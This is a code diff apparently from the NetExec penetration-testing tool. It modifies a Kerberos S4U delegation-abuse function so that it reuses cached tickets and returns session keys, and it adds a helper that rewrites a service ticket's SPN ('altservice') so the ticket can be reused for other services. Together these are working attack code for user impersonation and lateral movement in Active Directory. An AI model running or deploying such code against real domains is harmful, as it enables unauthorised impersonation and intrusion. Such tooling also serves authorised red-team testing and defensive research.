@@ -21,12 +21,13 @@ from nxc.logger import nxc_logger
 def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash, aesKey, kdcHost, impersonate, spn, use_cache, no_s4u2proxy=False):
     my_tgt = None
     if use_cache:
-        domain, _, tgt, _ = CCache.parseFile(domain, username, f"cifs/{hostname}")
-        if my_tgt is None:
+        domain, _, tgt, _ = CCache.parseFile(domain, username)
+        if tgt is None:
             raise
         my_tgt = tgt["KDC_REP"]
         cipher = tgt["cipher"]
         session_key = tgt["sessionKey"]
+        my_tgt = decoder.decode(my_tgt, asn1Spec=AS_REP())[0]
     if my_tgt is None:
         principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         nxc_logger.debug("Getting TGT for user")
@@ -156,7 +157,7 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
         tgs_formated["KDC_REP"] = r
         tgs_formated["cipher"] = cipher
         tgs_formated["sessionKey"] = new_session_key
-        return tgs_formated
+        return tgs_formated, session_key
 
     ################################################################################
     # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
@@ -275,4 +276,30 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
     tgs_formated["KDC_REP"] = r
     tgs_formated["cipher"] = cipher
     tgs_formated["sessionKey"] = new_session_key
-    return tgs_formated
+    return tgs_formated, session_key
+
+
+def get_realm_from_ticket(ticket):
+    tgs_rep = ticket["KDC_REP"]
+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]
+    return decoded_tgsrep["ticket"]["realm"]
+
+
+def kerberos_altservice(tgs, new_spn):
+    service, host = new_spn.split("/", 1)
+    tgs_rep = tgs["KDC_REP"]
+
+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]
+
+    # altservice
+    decoded_tgsrep["ticket"]["sname"]["name-string"].clear()
+    decoded_tgsrep["ticket"]["sname"]["name-string"].append(service)
+    decoded_tgsrep["ticket"]["sname"]["name-string"].append(host)
+
+    new_tgs_rep = encoder.encode(decoded_tgsrep)
+
+    new_tgs = {}
+    new_tgs["KDC_REP"] = new_tgs_rep
+    new_tgs["cipher"] = tgs["cipher"]
+    new_tgs["sessionKey"] = tgs["sessionKey"]
+    return new_tgs
